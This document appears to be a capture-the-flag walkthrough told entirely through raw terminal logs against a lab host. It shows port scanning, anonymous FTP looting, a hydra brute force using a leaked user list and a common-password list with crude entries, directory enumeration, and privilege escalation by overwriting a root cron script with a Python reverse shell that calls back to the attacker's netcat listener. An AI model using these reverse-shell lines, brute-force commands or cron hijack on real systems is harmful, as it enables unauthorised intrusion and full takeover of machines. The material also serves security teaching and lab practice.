```
root@kali:~# nmap -sV -sC -T4 -p- 10.10.244.158
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 11:40 UTC
Nmap scan report for ip-10-10-244-158.eu-west-1.compute.internal (10.10.244.158)
Host is up (0.00058s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.236.32
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 98:6c:7f:49:db:54:cb:36:6d:d5:ff:75:42:4c:a7:e0 (RSA)
|   256 0c:7b:1a:9c:ed:4b:29:f5:3e:be:1c:9a:e4:4c:07:2c (ECDSA)
|_  256 50:09:9f:c0:67:3e:89:93:b0:c9:85:f1:93:89:50:68 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:EE:F1:CB:81:17 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.53 seconds
```

```
root@kali:~# ftp 10.10.244.158
Connected to 10.10.244.158.
220 (vsFTPd 3.0.3)
Name (10.10.244.158:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ...
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
226 Directory send OK.
ftp> mget test.txt
mget test.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for test.txt (17 bytes).
226 Transfer complete.
17 bytes received in 0.00 secs (30.6868 kB/s)
ftp> cd ....
550 Failed to change directory.
ftp> cd ...
250 Directory successfully changed.
ftp> ;s -al
?Invalid command
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
drwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 ...
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 .
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
-rw-r--r--    1 ftp      ftp            14 Jul 05 21:45 yougotgoodeyes.txt
226 Directory send OK.
ftp> mget yougotgoodeyes.txt
mget yougotgoodeyes.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for yougotgoodeyes.txt (14 bytes).
226 Transfer complete.
14 bytes received in 0.00 secs (7.3743 kB/s)
ftp> exit
221 Goodbye.
```

- http://10.10.244.158/admin-dir/userid
```
d4rckh
thirtytwo
diablo
za9bx
enox
josh
zuamo
jake
based
aid
zori
lmapo
schr0
```

- http://10.10.244.158/admin-dir/credentials.txt
```
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
P@ssword1234
letmein
696969
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
pussy
superman
1qaz2wsx
7777777
fuckyou
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
fuckme
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
asshole
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
fuck
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
6969
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
minecraft
```
```
root@kali:~# vi user.txt
root@kali:~# vi pass.txt
root@kali:~# hydra -L user.txt -P pass.txt 10.10.244.158 http-post-form '/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:F=Incorrect'
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-13 11:51:33
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1326 login tries (l:13/p:102), ~83 tries per task
[DATA] attacking http-post-form://10.10.244.158:80/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:F=Incorrect
[80][http-post-form] host: 10.10.244.158   login: enox   password: P@ssword1234
```

```
root@kali:~# gobuster dir -u http://10.10.244.158/sUp3r-s3cr3t/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.244.158/sUp3r-s3cr3t/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php
[+] Timeout:        10s
===============================================================
2020/08/13 11:57:42 Starting gobuster
===============================================================
/images (Status: 301)
/index.html (Status: 200)
/home.php (Status: 302)
/authenticate.php (Status: 200)
Progress: 108651 / 220561 (49.26%)^C
[!] Keyboard interrupt detected, terminating.
```

```
root@kali:~# nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.236.32] from (UNKNOWN) [10.10.244.158] 40516
Linux ubuntu-xenial 4.4.0-184-generic #214-Ubuntu SMP Thu Jun 4 10:14:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 11:58:53 up 19 min,  0 users,  load average: 1.08, 0.44, 0.16
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*/2 *   * * *   root    python /home/d4rckh/cleanup.py
```

```
cat cleanup.py
# -*- coding: utf-8 -*-
#!/usr/bin/env python
import os
import sys
try:
        os.system('nc -e /bin/sh 10.10.236.32 1234')
except:
        sys.exit()

```

```
$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.236.32",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >cleanup.py
$
```

```
root@kali:~# nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.236.32] from (UNKNOWN) [10.10.244.158] 40532
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cd /root
# ls -al
total 36
drwx------  5 root root 4096 Jul  5 21:59 .
drwxr-xr-x 24 root root 4096 Aug 13 11:39 ..
-rw-------  1 root root  427 Jul  5 21:47 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Jul  5 21:59 .cache
drwxr-xr-x  2 root root 4096 Jul  5 21:36 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Jul  5 21:45 root.txt
drwx------  2 root root 4096 Jul  5 21:27 .ssh
# cat root.txt
```
